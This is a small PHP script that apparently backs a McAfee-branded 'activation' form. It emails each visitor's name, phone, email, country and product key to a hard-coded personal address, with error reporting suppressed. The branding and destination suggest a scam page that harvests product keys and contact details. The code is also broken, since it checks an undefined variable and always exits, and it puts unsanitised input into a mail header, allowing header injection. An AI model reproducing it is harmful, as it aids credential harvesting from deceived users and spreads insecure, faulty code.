<?php

 // ++++++++++++++++++++++++++++++++++++
error_reporting(0);

  
 // configuration
 
$email_it_to = "shaikh_nazish@ymail.com";

$error_message = "Please complete the form first";

$rnd=$_POST['rnd'];
$selectCountry=$_POST['country'];
$name=$_POST['name'];
$email=$_POST['email'];
$phone=$_POST['phone'];
$productKey=$_POST['productKey'];

  
if(!isset($rnd) || !isset($country) || !isset($name) || !isset($email) || !isset($phone) || !isset($productKey)) {
	echo $error_message;
    die();
}


$subject = "Subject";
$email_from = $email;
$site_name ="Mcafee card";

$email_message = '<html><body>';
$email_message .= '<div style="text-align:center;margin:0 auto;max-width:600px;box-sizing:border-box;display:table;background:#fff;width:90%;font-family:Arial, Helvetica, sans-serif; color:#666;border:3px solid #233c7e">';
$email_message .= '<table rules="all" style="border: 0px; width:100%;text-align:center;">';

$email_message .= "<tr style='display: block;border: 0px;padding: 10px 0;'><td style='border: 0px;width: 100%;float: left;padding: 10px;'><strong>Mcafee Internet Security Activation</strong></td></tr>";
$email_message .= "<tr style='display: block;border: 0px;padding: 10px 0;'><td style='border: 0px;width: 50%;float: left;padding: 10px;'><strong>Country Name :</strong> </td><td style='border: 0px;padding: 10px;'>" . stripslashes($country) . "</td></tr>";
$email_message .= "<tr style='display: block;border: 0px;padding: 10px 0;'><td style='border: 0px;width: 50%;float: left;padding: 10px;'><strong>Sender's Name :</strong> </td><td style='border: 0px;padding: 10px;'>" . stripslashes($name) . "</td></tr>";
$email_message .= "<tr style='display: block;border: 0px;padding: 10px 0;'><td style='border: 0px;width: 50%;float: left;padding: 10px;'><strong>Contact Number :</strong> </td><td style='border: 0px;padding: 10px;'>" . stripslashes($phone) . "</td></tr>";
$email_message .= "<tr style='display: block;border: 0px;padding: 10px 0;'><td style='border: 0px;width: 50%;float: left;padding: 10px;'><strong>Email :</strong> </td><td style='border: 0px;padding: 10px;'>" . stripslashes($email) . "</td></tr>";
$email_message .= "<tr style='display: block;border: 0px;padding: 10px 0;'><td style='border: 0px;width: 50%;float: left;padding: 10px;'><strong>productKey :</strong> </td><td style='border: 0px;padding: 10px;'>" . stripslashes($productKey) . "</td></tr>";

$email_message .= "<tr style='display: block;border: 0px;padding: 0;'><td style='border: 0px;clear:both;'></td></tr>";

$email_message .= "</table>";
$email_message .= "</div>";
$email_message .= "</body></html>";

// Always set content-type when sending HTML email


$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8". "\r\n";
$headers .= 'From: '.stripslashes($name);

//$headers .= 'From: <'.$email_from.'>' . "\r\n";

mail($email_it_to,$subject,$email_message,$headers);

?>